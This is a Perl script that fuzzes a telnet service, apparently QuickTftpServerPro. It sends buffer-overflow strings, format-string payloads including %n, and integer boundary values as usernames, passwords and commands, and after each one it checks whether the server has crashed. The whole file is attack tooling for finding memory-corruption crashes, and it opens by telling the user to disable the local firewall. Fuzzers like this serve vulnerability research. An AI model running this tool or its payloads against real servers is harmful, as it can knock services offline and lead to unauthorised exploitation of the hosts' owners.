#!/usr/bin/perl -w
use Net::Telnet;
use IO::Socket;
use Thread;
$|=1;

print "Please DISABLE firewall daemon of this operating system first, Thank you!\n";

$host=shift;
$port=shift || '23';
if(!defined($host)){
	print "usage: $0 \$host [\$port]\n";
	exit(0);
}

$check_first=IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>$port,Timeout=>60);
if(defined $check_first){
	print "$host -> $port is alive.\n";
	$check_first->close;
}else{
	die("$host -> $port is closed!\n");
}

sub check(){
	#Thread->self->detach;
	$sock=IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>$port,Timeout=>60);
	if(defined $sock){
		#print "$host -> $port is alive.\n";
		undef($content_tmp);
		$sock->recv($content_tmp,100,0);
		if(length($content_tmp)>0){
			$sock->close;
			return 1;
		}else{
			$sock->close;
			return 0;
		}
	}else{
		#print("$host -> $port is closed!\n");
		return 0;
	}
}

@bfo=(
'A'x3,
'A'x5,
'A'x17,
'A'x33,
'A'x65,
'A'x76,
'A'x129,
'A'x257,
'A'x513,
'A'x1024,
'A'x2049,
'A'x4097,
'A'x8193,
'A'x12288
);
@fse=(
'%s%p%x%d',
'024d',
'%.2049d',
'%p%p%p%p',
'%x%x%x%x',
'%d%d%d%d',
'%s%s%s%s',
'%99999999999s',
'%08x',
'%%20d',
'%%20n',
'%%20x',
'%%20s',
'%s%s%s%s%s%s%s%s%s%s',
'%p%p%p%p%p%p%p%p%p%p',
'%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%',
'%s'x129,
'%x'x257
);
@int=(
'-1',
'0',
'0x100',
'0x1000',
'0x3fffffff',
'0x7ffffffe',
'0x7fffffff',
'0x80000000',
'0xfffffffe',
'0xffffffff',
'0x10000',
'0x100000',
'1'
);
@all=@bfo;
push(@all, @fse);
push(@all, @int);

#Username Fuzzing...
print "Username Fuzzing...\n";
$password='bbb';
foreach $username (@all){
	$t = new Net::Telnet(Timeout => 10, Prompt => '/>$/');        #C:\Program Files\QuickTftpServerPro> #登陆后的shell标题样本
	$t->open($host);
	$result = $t->login(Name => $username, Password => $password, Errmode => 'return');
	undef($date); $date=`date /t`; chop($date);
	undef($time); $time=`time /t`; chop($time);
	print "$date, $time , ".($result?1:0)."\n";
	$thread1=Thread->new(\&check);
	if($thread1->join()!=1){
		print "Username Payload is $username.\n";
		print "Press <ENTER> to continue.\n";
		<STDIN>;
	}
	undef($thread1);
	#print "$result\n";
	$t->close;
}
print "Username Fuzz Finish!\n";

#Password Fuzzing...
print "Password Fuzzing...\n";
undef($username);
print "Please enter a valid username : ";
$username=<STDIN>;
chop($username);
undef($password);
foreach $password (@all){
	$t2 = new Net::Telnet(Timeout => 10, Prompt => '/>$/');        #C:\Program Files\QuickTftpServerPro> #登陆后的shell标题样本
	$t2->open($host);
	$result2 = $t2->login(Name => $username, Password => $password, Errmode => 'return');
	undef($date); $date=`date /t`; chop($date);
	undef($time); $time=`time /t`; chop($time);
	print "$date, $time , ".($result2?1:0)."\n";
	$thread2=Thread->new(\&check);
	if($thread2->join()!=1){
		print "Password Payload is $password.\n";
		print "Press <ENTER> to continue.\n";
		<STDIN>;
	}
	undef($thread2);
	#print "$result2\n";
	$t2->close;
}
print "Password Fuzz Finish!\n";

#Command Fuzzing...
print "Command Fuzzing...\n";
undef($username);
print "Please enter a real username : ";
$username=<STDIN>;
chop($username);
undef($password);
print "Please enter a real password : ";
$password=<STDIN>;
chop($password);
foreach $command (@all){
	$t3 = new Net::Telnet(Timeout => 10, Prompt => '/>$/');        #C:\Program Files\QuickTftpServerPro> #登陆后的shell标题样本
	$t3->open($host);
	$result3 = $t3->login(Name => $username, Password => $password, Errmode => 'return');
	undef($date); $date=`date /t`; chop($date);
	undef($time); $time=`time /t`; chop($time);
	print "$date, $time , ".($result3?1:0)."\n";
	$t3->print($command);
	$thread3=Thread->new(\&check);
	if($thread3->join()!=1){
		print "Password Payload is $command.\n";
		print "Press <ENTER> to continue.\n";
		<STDIN>;
	}
	undef($thread3);
	#print "$result3\n";
	$t3->close;
}
print "Command Fuzz Finish!\n";

print "All Finish!\n";

exit(0);